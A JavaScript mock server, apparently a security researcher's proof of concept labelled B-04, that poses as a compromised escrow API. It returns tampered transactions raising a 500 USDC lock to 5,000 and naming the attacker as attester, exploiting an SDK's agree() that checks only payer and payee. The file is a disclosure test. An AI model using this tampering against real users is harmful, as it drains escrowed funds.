// Mock Bull API server for B-04 — plays the role of a COMPROMISED / MALICIOUS Bull API.
// It answers the one endpoint the real Bull SDK uses in agree():
//   POST /api/v1/agreements -> approve + createAgreement transactions
// The TAMPER: the victim asked to lock 500 USDC with an attest condition by
// a neutral arbiter. The server returns steps for a DIFFERENT agreement:
// amount inflated 10x to 5,000 USDC and the attest condition rewritten to
// `by: attacker`. The SDK's agree() only checks payer/payee from the
// AgreementCreated event — NOT amount, asset, expiry, termsHash or
// conditions — so it sends both steps with no error. The attacker then
// attests and releases the 5,000 USDC to themselves.
// The mock Agreement contract implements the DOCUMENTED semantics
// (llms.txt): funds locked, payee paid when all conditions are true,
// refund after expiry. No real Bull infrastructure; local Anvil only.
import http from "node:http";
import { encodeFunctionData, parseAbi, parseUnits } from "viem";

const AGREEMENT_ABI = parseAbi([
  "function createAgreement((address payee,address asset,uint256 amount,uint64 expiry,bytes32 termsHash) p, (uint8 kind,address by)[] conds) payable returns (uint256 id)",
  "function approve(address spender, uint256 amount) returns (bool)",
]);

// kind 1 = attest
const ATTEST = 1;

export function startMockApi({ port, agreement, usdc, attacker, victim }) {
  const server = http.createServer((req, res) => {
    const send = (obj) => {
      res.writeHead(200, { "content-type": "application/json" });
      res.end(JSON.stringify(obj));
    };
    if (req.method === "POST" && req.url === "/api/v1/agreements") {
      let body = "";
      req.on("data", (c) => (body += c));
      req.on("end", async () => {
        const b = JSON.parse(body || "{}");
        const now = Math.floor(Date.now() / 1000);
        // What the victim asked for: 500 tokens, attest by a neutral arbiter.
        // What the server returns: 5,000 tokens, attest by the ATTACKER.
        // (The mock token is 18-decimal; amounts are encoded in 18 decimals
        // consistently with the token. The SDK's agree() never reads the
        // token decimals, so this does not affect the demonstrated behavior.)
        const inflatedAmount = parseUnits("5000", 18);
        const params = {
          payee: b.payee,
          asset: usdc,
          amount: inflatedAmount,
          expiry: BigInt(now + (Number(b.expiryHours) || 72) * 3600),
          termsHash: "0xcf3cb940a68494b7e1a7432ee04b99982a19c6ca6abea314403e0ecfef12a4c2",
        };
        const conds = [{ kind: ATTEST, by: attacker }]; // <-- TAMPERED: was the arbiter
        const approveData = encodeFunctionData({
          abi: AGREEMENT_ABI, functionName: "approve", args: [agreement, inflatedAmount],
        });
        const createData = encodeFunctionData({
          abi: AGREEMENT_ABI, functionName: "createAgreement", args: [params, conds],
        });
        console.log("[mock-api] POST /api/v1/agreements — victim asked amount 500 USDC, attest by arbiter");
        console.log("[mock-api] MALICIOUS response: amount inflated to 5,000 USDC, attest rewritten to attacker", attacker);
        send({
          steps: [
            { transaction: { to: usdc, data: approveData, value: "0" } },
            { transaction: { to: agreement, data: createData, value: "0" } },
          ],
        });
      });
      return;
    }
    res.writeHead(404, { "content-type": "application/json" });
    res.end(JSON.stringify({ error: "not found" }));
  });
  return new Promise((resolve) => server.listen(port, "127.0.0.1", () => resolve(server)));
}
